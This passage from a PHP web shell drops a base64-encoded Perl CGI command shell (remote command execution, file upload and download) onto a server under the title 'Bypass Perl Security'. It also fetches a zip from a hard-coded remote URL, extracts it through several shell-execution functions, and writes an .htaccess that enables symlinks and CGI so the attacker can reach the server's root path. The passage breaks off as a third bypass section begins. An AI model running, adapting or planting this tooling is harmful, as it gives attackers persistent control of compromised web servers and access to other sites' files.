2FsbGVkIHdoZW4gdGhlIHRpbWVvdXQgZm9yIGEgY29tbWFuZCBleHBpcmVzLiBXZSBuZWVkIHRvDQojIHRlcm1pbmF0ZSB0aGUgc2NyaXB0IGltbWVkaWF0ZWx5LiBUaGlzIGZ1bmN0aW9uIGlzIHZhbGlkIG9ubHkgb24gVW5peC4gSXQgaXMNCiMgbmV2ZXIgY2FsbGVkIHdoZW4gdGhlIHNjcmlwdCBpcyBydW5uaW5nIG9uIE5ULg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIENvbW1hbmRUaW1lb3V0DQp7DQoJaWYoISRXaW5OVCkNCgl7DQoJCWFsYXJtKDApOw0KCQlwcmludCA8PEVORDsNCjwveG1wPg0KDQo8Y29kZT4NCkNvbW1hbmQgZXhjZWVkZWQgbWF4aW11bSB0aW1lIG9mICRDb21tYW5kVGltZW91dER1cmF0aW9uIHNlY29uZChzKS4NCjxicj5LaWxsZWQgaXQhDQpFTkQNCgkJJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07DQoJCSZQcmludFBhZ2VGb290ZXI7DQoJCWV4aXQ7DQoJfQ0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHRvIGV4ZWN1dGUgY29tbWFuZHMuIEl0IGRpc3BsYXlzIHRoZSBvdXRwdXQgb2YgdGhlDQojIGNvbW1hbmQgYW5kIGFsbG93cyB0aGUgdXNlciB0byBlbnRlciBhbm90aGVyIGNvbW1hbmQuIFRoZSBjaGFuZ2UgZGlyZWN0b3J5DQojIGNvbW1hbmQgaXMgaGFuZGxlZCBkaWZmZXJlbnRseS4gSW4gdGhpcyBjYXNlLCB0aGUgbmV3IGRpcmVjdG9yeSBpcyBzdG9yZWQgaW4NCiMgYW4gaW50ZXJuYWwgdmFyaWFibGUgYW5kIGlzIHVzZWQgZWFjaCB0aW1lIGEgY29tbWFuZCBoYXMgdG8gYmUgZXhlY3V0ZWQuIFRoZQ0KIyBvdXRwdXQgb2YgdGhlIGNoYW5nZSBkaXJlY3RvcnkgY29tbWFuZCBpcyBub3QgZGlzcGxheWVkIHRvIHRoZSB1c2Vycw0KIyB0aGVyZWZvcmUgZXJyb3IgbWVzc2FnZXMgY2Fubm90IGJlIGRpc3BsYXllZC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBFeGVjdXRlQ29tbWFuZA0Kew0KCWlmKCRSdW5Db21tYW5kID1+IG0vXlxzKmNkXHMrKC4rKS8pICMgaXQgaXMgYSBjaGFuZ2UgZGlyIGNvbW1hbmQNCgl7DQoJCSMgd2UgY2hhbmdlIHRoZSBkaXJlY3RvcnkgaW50ZXJuYWxseS4gVGhlIG91dHB1dCBvZiB0aGUNCgkJIyBjb21tYW5kIGlzIG5vdCBkaXNwbGF5ZWQuDQoJCQ0KCQkkT2xkRGlyID0gJEN1cnJlbnREaXI7DQoJCSRDb21tYW5kID0gImNkIFwiJEN1cnJlbnREaXJcIiIuJENtZFNlcC4iY2QgJDEiLiRDbWRTZXAuJENtZFB3ZDsNCgkJY2hvcCgkQ3VycmVudERpciA9IGAkQ29tbWFuZGApOw0KCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7DQoJCSRQcm9tcHQgPSAkV2luTlQgPyAiJE9sZERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRPbGREaXJdXCQgIjsNCgkJcHJpbnQgIiRQcm9tcHQgJFJ1bkNvbW1hbmQiOw0KCX0NCgllbHNlICMgc29tZSBvdGhlciBjb21tYW5kLCBkaXNwbGF5IHRoZSBvdXRwdXQNCgl7DQoJCSZQcmludFBhZ2VIZWFkZXIoImMiKTsNCgkJJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7DQoJCXByaW50ICIkUHJvbXB0ICRSdW5Db21tYW5kPHhtcD4iOw0KCQkkQ29tbWFuZCA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuJFJ1bkNvbW1hbmQuJFJlZGlyZWN0b3I7DQoJCWlmKCEkV2luTlQpDQoJCXsNCgkJCSRTSUd7J0FMUk0nfSA9IFwmQ29tbWFuZFRpbWVvdXQ7DQoJCQlhbGFybSgkQ29tbWFuZFRpbWVvdXREdXJhdGlvbik7DQoJCX0NCgkJaWYoJFNob3dEeW5hbWljT3V0cHV0KSAjIHNob3cgb3V0cHV0IGFzIGl0IGlzIGdlbmVyYXRlZA0KCQl7DQoJCQkkfD0xOw0KCQkJJENvbW1hbmQgLj0gIiB8IjsNCgkJCW9wZW4oQ29tbWFuZE91dHB1dCwgJENvbW1hbmQpOw0KCQkJd2hpbGUoPENvbW1hbmRPdXRwdXQ+KQ0KCQkJew0KCQkJCSRfID1+IHMvKFxufFxyXG4pJC8vOw0KCQkJCXByaW50ICIkX1xuIjsNCgkJCX0NCgkJCSR8PTA7DQoJCX0NCgkJZWxzZSAjIHNob3cgb3V0cHV0IGFmdGVyIGNvbW1hbmQgY29tcGxldGVzDQoJCXsNCgkJCXByaW50IGAkQ29tbWFuZGA7DQoJCX0NCgkJaWYoISRXaW5OVCkNCgkJew0KCQkJYWxhcm0oMCk7DQoJCX0NCgkJcHJpbnQgIjwveG1wPiI7DQoJfQ0KCSZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KCSZQcmludFBhZ2VGb290ZXI7DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBkaXNwbGF5cyB0aGUgcGFnZSB0aGF0IGNvbnRhaW5zIGEgbGluayB3aGljaCBhbGxvd3MgdGhlIHVzZXINCiMgdG8gZG93bmxvYWQgdGhlIHNwZWNpZmllZCBmaWxlLiBUaGUgcGFnZSBhbHNvIGNvbnRhaW5zIGEgYXV0by1yZWZyZXNoDQojIGZlYXR1cmUgdGhhdCBzdGFydHMgdGhlIGRvd25sb2FkIGF1dG9tYXRpY2FsbHkuDQojIEFyZ3VtZW50IDE6IEZ1bGx5IHF1YWxpZmllZCBmaWxlbmFtZSBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnREb3dubG9hZExpbmtQYWdlDQp7DQoJbG9jYWwoJEZpbGVVcmwpID0gQF87DQoJaWYoLWUgJEZpbGVVcmwpICMgaWYgdGhlIGZpbGUgZXhpc3RzDQoJew0KCQkjIGVuY29kZSB0aGUgZmlsZSBsaW5rIHNvIHdlIGNhbiBzZW5kIGl0IHRvIHRoZSBicm93c2VyDQoJCSRGaWxlVXJsID1+IHMvKFteYS16QS1aMC05XSkvJyUnLnVucGFjaygiSCoiLCQxKS9lZzsNCgkJJERvd25sb2FkTGluayA9ICIkU2NyaXB0TG9jYXRpb24/YT1kb3dubG9hZCZmPSRGaWxlVXJsJm89Z28iOw0KCQkkSHRtbE1ldGFIZWFkZXIgPSAiPG1ldGEgSFRUUC1FUVVJVj1cIlJlZnJlc2hcIiBDT05URU5UPVwiMTsgVVJMPSREb3dubG9hZExpbmtcIj4iOw0KCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7DQoJCXByaW50IDw8RU5EOw0KPGNvZGU+DQoNClNlbmRpbmcgRmlsZSAkVHJhbnNmZXJGaWxlLi4uPGJyPg0KSWYgdGhlIGRvd25sb2FkIGRvZXMgbm90IHN0YXJ0IGF1dG9tYXRpY2FsbHksDQo8YSBocmVmPSIkRG93bmxvYWRMaW5rIj5DbGljayBIZXJlPC9hPi4NCkVORA0KCQkmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCgkJJlByaW50UGFnZUZvb3RlcjsNCgl9DQoJZWxzZSAjIGZpbGUgZG9lc24ndCBleGlzdA0KCXsNCgkJJlByaW50UGFnZUhlYWRlcigiZiIpOw0KCQlwcmludCAiRmFpbGVkIHRvIGRvd25sb2FkICRGaWxlVXJsOiAkISI7DQoJCSZQcmludEZpbGVEb3dubG9hZEZvcm07DQoJCSZQcmludFBhZ2VGb290ZXI7DQoJfQ0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gcmVhZHMgdGhlIHNwZWNpZmllZCBmaWxlIGZyb20gdGhlIGRpc2sgYW5kIHNlbmRzIGl0IHRvIHRoZQ0KIyBicm93c2VyLCBzbyB0aGF0IGl0IGNhbiBiZSBkb3dubG9hZGVkIGJ5IHRoZSB1c2VyLg0KIyBBcmd1bWVudCAxOiBGdWxseSBxdWFsaWZpZWQgcGF0aG5hbWUgb2YgdGhlIGZpbGUgdG8gYmUgc2VudC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBTZW5kRmlsZVRvQnJvd3Nlcg0Kew0KCWxvY2FsKCRTZW5kRmlsZSkgPSBAXzsNCglpZihvcGVuKFNFTkRGSUxFLCAkU2VuZEZpbGUpKSAjIGZpbGUgb3BlbmVkIGZvciByZWFkaW5nDQoJew0KCQlpZigkV2luTlQpDQoJCXsNCgkJCWJpbm1vZGUoU0VOREZJTEUpOw0KCQkJYmlubW9kZShTVERPVVQpOw0KCQl9DQoJCSRGaWxlU2l6ZSA9IChzdGF0KCRTZW5kRmlsZSkpWzddOw0KCQkoJEZpbGVuYW1lID0gJFNlbmRGaWxlKSA9fiAgbSEoW14vXlxcXSopJCE7DQoJCXByaW50ICJDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtdW5rbm93blxuIjsNCgkJcHJpbnQgIkNvbnRlbnQtTGVuZ3RoOiAkRmlsZVNpemVcbiI7DQoJCXByaW50ICJDb250ZW50LURpc3Bvc2l0aW9uOiBhdHRhY2htZW50OyBmaWxlbmFtZT0kMVxuXG4iOw0KCQlwcmludCB3aGlsZSg8U0VOREZJTEU+KTsNCgkJY2xvc2UoU0VOREZJTEUpOw0KCX0NCgllbHNlICMgZmFpbGVkIHRvIG9wZW4gZmlsZQ0KCXsNCgkJJlByaW50UGFnZUhlYWRlcigiZiIpOw0KCQlwcmludCAiRmFpbGVkIHRvIGRvd25sb2FkICRTZW5kRmlsZTogJCEiOw0KCQkmUHJpbnRGaWxlRG93bmxvYWRGb3JtOw0KDQoJCSZQcmludFBhZ2VGb290ZXI7DQoJfQ0KfQ0KDQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciBkb3dubG9hZHMgYSBmaWxlLiBJdCBkaXNwbGF5cyBhIG1lc3NhZ2UNCiMgdG8gdGhlIHVzZXIgYW5kIHByb3ZpZGVzIGEgbGluayB0aHJvdWdoIHdoaWNoIHRoZSBmaWxlIGNhbiBiZSBkb3dubG9hZGVkLg0KIyBUaGlzIGZ1bmN0aW9uIGlzIGFsc28gY2FsbGVkIHdoZW4gdGhlIHVzZXIgY2xpY2tzIG9uIHRoYXQgbGluay4gSW4gdGhpcyBjYXNlLA0KIyB0aGUgZmlsZSBpcyByZWFkIGFuZCBzZW50IHRvIHRoZSBicm93c2VyLg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEJlZ2luRG93bmxvYWQNCnsNCgkjIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkDQoJaWYoKCRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlxcfF4uOi8pKSB8DQoJCSghJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXC8vKSkpICMgcGF0aCBpcyBhYnNvbHV0ZQ0KCXsNCgkJJFRhcmdldEZpbGUgPSAkVHJhbnNmZXJGaWxlOw0KCX0NCgllbHNlICMgcGF0aCBpcyByZWxhdGl2ZQ0KCXsNCgkJY2hvcCgkVGFyZ2V0RmlsZSkgaWYoJFRhcmdldEZpbGUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsNCgkJJFRhcmdldEZpbGUgLj0gJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsNCgl9DQoNCglpZigkT3B0aW9ucyBlcSAiZ28iKSAjIHdlIGhhdmUgdG8gc2VuZCB0aGUgZmlsZQ0KCXsNCgkJJlNlbmRGaWxlVG9Ccm93c2VyKCRUYXJnZXRGaWxlKTsNCgl9DQoJZWxzZSAjIHdlIGhhdmUgdG8gc2VuZCBvbmx5IHRoZSBsaW5rIHBhZ2UNCgl7DQoJCSZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOw0KCX0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB1c2VyIHdhbnRzIHRvIHVwbG9hZCBhIGZpbGUuIElmIHRoZQ0KIyBmaWxlIGlzIG5vdCBzcGVjaWZpZWQsIGl0IGRpc3BsYXlzIGEgZm9ybSBhbGxvd2luZyB0aGUgdXNlciB0byBzcGVjaWZ5IGENCiMgZmlsZSwgb3RoZXJ3aXNlIGl0IHN0YXJ0cyB0aGUgdXBsb2FkIHByb2Nlc3MuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgVXBsb2FkRmlsZQ0Kew0KCSMgaWYgbm8gZmlsZSBpcyBzcGVjaWZpZWQsIHByaW50IHRoZSB1cGxvYWQgZm9ybSBhZ2Fpbg0KCWlmKCRUcmFuc2ZlckZpbGUgZXEgIiIpDQoJew0KCQkmUHJpbnRQYWdlSGVhZGVyKCJmIik7DQoJCSZQcmludEZpbGVVcGxvYWRGb3JtOw0KCQkmUHJpbnRQYWdlRm9vdGVyOw0KCQlyZXR1cm47DQoJfQ0KCSZQcmludFBhZ2VIZWFkZXIoImMiKTsNCg0KCSMgc3RhcnQgdGhlIHVwbG9hZGluZyBwcm9jZXNzDQoJcHJpbnQgIlVwbG9hZGluZyAkVHJhbnNmZXJGaWxlIHRvICRDdXJyZW50RGlyLi4uPGJyPiI7DQoNCgkjIGdldCB0aGUgZnVsbGx5IHF1YWxpZmllZCBwYXRobmFtZSBvZiB0aGUgZmlsZSB0byBiZSBjcmVhdGVkDQoJY2hvcCgkVGFyZ2V0TmFtZSkgaWYgKCRUYXJnZXROYW1lID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87DQoJJFRyYW5zZmVyRmlsZSA9fiBtIShbXi9eXFxdKikkITsNCgkkVGFyZ2V0TmFtZSAuPSAkUGF0aFNlcC4kMTsNCg0KCSRUYXJnZXRGaWxlU2l6ZSA9IGxlbmd0aCgkaW57J2ZpbGVkYXRhJ30pOw0KCSMgaWYgdGhlIGZpbGUgZXhpc3RzIGFuZCB3ZSBhcmUgbm90IHN1cHBvc2VkIHRvIG92ZXJ3cml0ZSBpdA0KCWlmKC1lICRUYXJnZXROYW1lICYmICRPcHRpb25zIG5lICJvdmVyd3JpdGUiKQ0KCXsNCgkJcHJpbnQgIkZhaWxlZDogRGVzdGluYXRpb24gZmlsZSBhbHJlYWR5IGV4aXN0cy48YnI+IjsNCgl9DQoJZWxzZSAjIGZpbGUgaXMgbm90IHByZXNlbnQNCgl7DQoJCWlmKG9wZW4oVVBMT0FERklMRSwgIj4kVGFyZ2V0TmFtZSIpKQ0KCQl7DQoJCQliaW5tb2RlKFVQTE9BREZJTEUpIGlmICRXaW5OVDsNCgkJCXByaW50IFVQTE9BREZJTEUgJGlueydmaWxlZGF0YSd9Ow0KCQkJY2xvc2UoVVBMT0FERklMRSk7DQoJCQlwcmludCAiVHJhbnNmZXJlZCAkVGFyZ2V0RmlsZVNpemUgQnl0ZXMuPGJyPiI7DQoJCQlwcmludCAiRmlsZSBQYXRoOiAkVGFyZ2V0TmFtZTxicj4iOw0KCQl9DQoJCWVsc2UNCgkJew0KCQkJcHJpbnQgIkZhaWxlZDogJCE8YnI+IjsNCgkJfQ0KCX0NCglwcmludCAiIjsNCgkmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCg0KCSZQcmludFBhZ2VGb290ZXI7DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciB3YW50cyB0byBkb3dubG9hZCBhIGZpbGUuIElmIHRoZQ0KIyBmaWxlbmFtZSBpcyBub3Qgc3BlY2lmaWVkLCBpdCBkaXNwbGF5cyBhIGZvcm0gYWxsb3dpbmcgdGhlIHVzZXIgdG8gc3BlY2lmeSBhDQojIGZpbGUsIG90aGVyd2lzZSBpdCBkaXNwbGF5cyBhIG1lc3NhZ2UgdG8gdGhlIHVzZXIgYW5kIHByb3ZpZGVzIGEgbGluaw0KIyB0aHJvdWdoICB3aGljaCB0aGUgZmlsZSBjYW4gYmUgZG93bmxvYWRlZC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBEb3dubG9hZEZpbGUNCnsNCgkjIGlmIG5vIGZpbGUgaXMgc3BlY2lmaWVkLCBwcmludCB0aGUgZG93bmxvYWQgZm9ybSBhZ2Fpbg0KCWlmKCRUcmFuc2ZlckZpbGUgZXEgIiIpDQoJew0KCQkmUHJpbnRQYWdlSGVhZGVyKCJmIik7DQoJCSZQcmludEZpbGVEb3dubG9hZEZvcm07DQoJCSZQcmludFBhZ2VGb290ZXI7DQoJCXJldHVybjsNCgl9DQoJDQoJIyBnZXQgZnVsbHkgcXVhbGlmaWVkIHBhdGggb2YgdGhlIGZpbGUgdG8gYmUgZG93bmxvYWRlZA0KCWlmKCgkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cXHxeLjovKSkgfA0KCQkoISRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlwvLykpKSAjIHBhdGggaXMgYWJzb2x1dGUNCgl7DQoJCSRUYXJnZXRGaWxlID0gJFRyYW5zZmVyRmlsZTsNCgl9DQoJZWxzZSAjIHBhdGggaXMgcmVsYXRpdmUNCgl7DQoJCWNob3AoJFRhcmdldEZpbGUpIGlmKCRUYXJnZXRGaWxlID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87DQoJCSRUYXJnZXRGaWxlIC49ICRQYXRoU2VwLiRUcmFuc2ZlckZpbGU7DQoJfQ0KDQoJaWYoJE9wdGlvbnMgZXEgImdvIikgIyB3ZSBoYXZlIHRvIHNlbmQgdGhlIGZpbGUNCgl7DQoJCSZTZW5kRmlsZVRvQnJvd3NlcigkVGFyZ2V0RmlsZSk7DQoJfQ0KCWVsc2UgIyB3ZSBoYXZlIHRvIHNlbmQgb25seSB0aGUgbGluayBwYWdlDQoJew0KCQkmUHJpbnREb3dubG9hZExpbmtQYWdlKCRUYXJnZXRGaWxlKTsNCgl9DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgTWFpbiBQcm9ncmFtIC0gRXhlY3V0aW9uIFN0YXJ0cyBIZXJlDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQomUmVhZFBhcnNlOw0KJkdldENvb2tpZXM7DQoNCiRTY3JpcHRMb2NhdGlvbiA9ICRFTlZ7J1NDUklQVF9OQU1FJ307DQokU2VydmVyTmFtZSA9ICRFTlZ7J1NFUlZFUl9OQU1FJ307DQokTG9naW5QYXNzd29yZCA9ICRpbnsncCd9Ow0KJFJ1bkNvbW1hbmQgPSAkaW57J2MnfTsNCiRUcmFuc2ZlckZpbGUgPSAkaW57J2YnfTsNCiRPcHRpb25zID0gJGlueydvJ307DQoNCiRBY3Rpb24gPSAkaW57J2EnfTsNCiRBY3Rpb24gPSAibG9naW4iIGlmKCRBY3Rpb24gZXEgIiIpOyAjIG5vIGFjdGlvbiBzcGVjaWZpZWQsIHVzZSBkZWZhdWx0DQoNCiMgZ2V0IHRoZSBkaXJlY3RvcnkgaW4gd2hpY2ggdGhlIGNvbW1hbmRzIHdpbGwgYmUgZXhlY3V0ZWQNCiRDdXJyZW50RGlyID0gJGlueydkJ307DQpjaG9wKCRDdXJyZW50RGlyID0gYCRDbWRQd2RgKSBpZigkQ3VycmVudERpciBlcSAiIik7DQoNCiRMb2dnZWRJbiA9ICRDb29raWVzeydTQVZFRFBXRCd9IGVxICRQYXNzd29yZDsNCg0KaWYoJEFjdGlvbiBlcSAibG9naW4iIHx8ICEkTG9nZ2VkSW4pICMgdXNlciBuZWVkcy9oYXMgdG8gbG9naW4NCnsNCgkmUGVyZm9ybUxvZ2luOw0KDQp9DQplbHNpZigkQWN0aW9uIGVxICJjb21tYW5kIikgIyB1c2VyIHdhbnRzIHRvIHJ1biBhIGNvbW1hbmQNCnsNCgkmRXhlY3V0ZUNvbW1hbmQ7DQp9DQplbHNpZigkQWN0aW9uIGVxICJ1cGxvYWQiKSAjIHVzZXIgd2FudHMgdG8gdXBsb2FkIGEgZmlsZQ0Kew0KCSZVcGxvYWRGaWxlOw0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAiZG93bmxvYWQiKSAjIHVzZXIgd2FudHMgdG8gZG93bmxvYWQgYSBmaWxlDQp7DQoJJkRvd25sb2FkRmlsZTsNCn0NCmVsc2lmKCRBY3Rpb24gZXEgImxvZ291dCIpICMgdXNlciB3YW50cyB0byBsb2dvdXQNCnsNCgkmUGVyZm9ybUxvZ291dDsNCn0=';

                                                                            $file = fopen("vw.root" ,"w+");
                                                                            $write = fwrite ($file ,base64_decode($cgipl));
                                                                            fclose($file);
                                                                            chmod("vw.root",0755);
                                                                            echo "<br><center><span style='font-size:30px; font-family:Tahoma, Geneva, sans-serif; color:#009900'>Bypass Perl Security</span><br><br><iframe src=cgipl/vw.root width=75% height=50% frameborder=0></iframe>
 
</div>";
                                                                        }
                                                                        /////////////////////////////////////////////////coeg///// /////////////////////////////
                                                                        elseif(isset($_GET['x']) && ($_GET['x'] == 'bypsrootwzp'))
                                                                        {

                                                                            echo'<center><span style="font-size:30px; font-family:Tahoma, Geneva, sans-serif; color:#009900">Bypass Root Path With Zip File</span><br></center>';
                                                                            echo"<p align='center'><img border='0' src='http://4.bp.blogspot.com/-B2RRd3iYCgI/Uj6UtLxxApI/AAAAAAAAATc/DJHEPAWNTmk/s320/Password-protected-zip-file.png'></p>";
                                                                            echo'<div class="tul"><font color="009900" face="Impact, Geneva, sans-serif" style="font-size: 8pt"><font/>';

                                                                            echo"<center><font face='ghost' color='red' size='5'><font/>
<form method='post'>
<input class='inputzbut' type='submit' value='Grab To Root Now' name='fuck'><br>
<center><font color='red' size='4' face='ghost'>Remote Zip File</font><input class='inputz' type='text' size='40' name='shell' value='http://hcp1.es/wp-content/uploads/v4.zip' 
</font></center>
</form>
</center>
</p>";


                                                                            @error_reporting(0);

                                                                            $file = $_POST['shell'];
//Generate zip file
                                                                            mkdir('wooooot', 0755);
                                                                            chdir('wooooot');
                                                                            $fopen = fopen("v4.zip",'w');
                                                                            $shell = @file_get_contents($file);
                                                                            $swrite = fwrite($fopen ,$shell);
                                                                            if($swrite){
                                                                                echo "Zip File Downloaded Successfully\n";
                                                                                sleep(2);
                                                                                echo "<p>Going To Unzip the File to Get r00t....</p>";

                                                                                sleep(2);

//system
                                                                                system('unzip v4.zip');



//passthru
                                                                                passthru('unzip v4.zip');



//shell_exec
                                                                                shell_exec('unzip v4.zip');



//exec
                                                                                exec('unzip v4.zip');


//proc_open
                                                                                proc_open('unzip v4.zip');




                                                                                sleep(1);

//Extracting htaccess For Symlink
                                                                                chdir('wooooot');
                                                                                $htaccess = 'T1BUSU9OUyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzIFN5bUxpbmtzSWZPd25lck1hdGNoIEluY2x1ZGVzIEluY2x1ZGVzTk9FWEVDIEV4ZWNDR0kNCk9wdGlvbnMgSW5kZXhlcyBGb2xsb3dTeW1MaW5rcw0KRm9yY2VUeXBlIHRleHQvcGxhaW4NCkFkZFR5cGUgdGV4dC9wbGFpbiAucGhwIA0KQWRkVHlwZSB0ZXh0L3BsYWluIC5odG1sDQpBZGRUeXBlIHRleHQvaHRtbCAuc2h0bWwNCkFkZFR5cGUgdHh0IC5waHANCkFkZEhhbmRsZXIgc2VydmVyLXBhcnNlZCAucGhwDQpBZGRIYW5kbGVyIHR4dCAucGhwDQpBZGRIYW5kbGVyIHR4dCAuaHRtbA0KQWRkSGFuZGxlciB0eHQgLnNodG1sDQpPcHRpb25zIEFsbA0KT3B0aW9ucyBBbGw=';
                                                                                $priv8priv = fopen(".htaccess" ,"w+");
                                                                                $xwrite = fwrite ($priv8priv ,base64_decode($htaccess));

                                                                                sleep(1);

                                                                                echo "<p>Loading Perl unzipper.... \!/ </p>";
//dezipper.pl generate
                                                                                chdir('wooooot');
                                                                                $l0vercodee = 'eyANCnN5c3RlbSgidW56aXAgdjQuemlwIik7DQpleGVjKCJ1bnppcCB2NC56aXAiKTsNCnBhc3N0aHJ1KCJ1bnppcCB2NC56aXAiKTsNCnNoZWxsX2V4ZWMoInVuemlwIHY0LnppcCIpOw0KcHJvY19vcGVuKCJ1bnppcCB2NC56aXAiKTsNCn0=';
                                                                                $greatshiit = fopen("dezipper.pl" ,"w+");
                                                                                $write = fwrite ($greatshiit ,base64_decode($l0vercodee));
                                                                                if($write){
                                                                                    echo "<p>Perl Unzipper Downloaded Successfully</p>";
                                                                                    fclose($greatshiit);
                                                                                    chmod("dezipper.pl",0755);

                                                                                    echo "<p>Unzipping File with Perl \!/ </p>";

                                                                                    system('perl dezipper.pl');
                                                                                    passthru('perl dezipper.pl');
                                                                                    shell_exec('perl dezipper.pl');
                                                                                    exec('perl dezipper.pl');
                                                                                    proc_open('perl dezipper.pl');

                                                                                    echo"<br><a href=wooooot/1.txt TARGET='_blank'>Link=====><font color=red size=3 face='Courier New'><b>Root Path</b></font></a>";

                                                                                }
                                                                            }
                                                                        }
                                                                        /////////////////////////////////////////////////coeg///// /////////////////////////////
                                                                        elseif(isset($_GET['x']) && ($_GET['x'] == 'bforb'))
                                                                        {
                                                                            echo '<br><center><span style="font-size:30px; font-family:Tahoma, Geneva, sans-serif; color:#009900">Bypass Root Path with system function</span><center><br>';
                                                                            mkdir('tools', 0755);
                                                                            chdir('tools');
